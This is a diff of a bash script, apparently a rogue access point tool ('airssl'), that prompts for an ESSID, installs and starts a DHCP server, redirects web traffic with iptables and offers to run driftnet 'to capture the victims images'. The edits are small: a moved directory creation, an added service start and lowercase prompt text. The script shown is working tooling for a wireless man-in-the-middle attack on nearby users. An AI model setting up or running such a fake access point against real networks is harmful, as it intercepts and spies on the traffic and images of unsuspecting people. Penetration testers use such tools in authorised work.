@@ -14,11 +14,11 @@ echo -n "Enter the ESSID: "
 read -e ESSID
 fakeap=$fakeap_interface
 
+mkdir -p "/pentest/wireless/airssl"
+
 echo "Installing DHCP Server"
 apt-get update
 apt-get install isc-dhcp-server
-
-mkdir -p "/pentest/wireless/airssl"
 
 # Dhcpd creation
 
@@ -68,6 +68,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 
 # DHCP
 echo "[+] Starting DHCP..."
+service isc-dhcp-server start
 dhcpd -cf /etc/dhcp/dhcpd.conf
 sleep 3
 
@@ -88,7 +89,7 @@ echo "[+] Driftnet?"
 echo
 echo "Would you also like to start driftnet to capture the victims images,
 (this may make the network a little slower), "
-echo "Y or N "
+echo "y or n "
 read DRIFT
 
 if [ $DRIFT = "y" ] ; then
@@ -105,7 +106,7 @@ echo
 echo "[+] Activated..."
 echo
 echo "[+] IMPORTANT..."
-echo "After you have finished please stop the attack properly by hitting (Y)"
+echo "After you have finished please stop the attack properly by hitting (y)"
 read WISH
 
 # Clean up
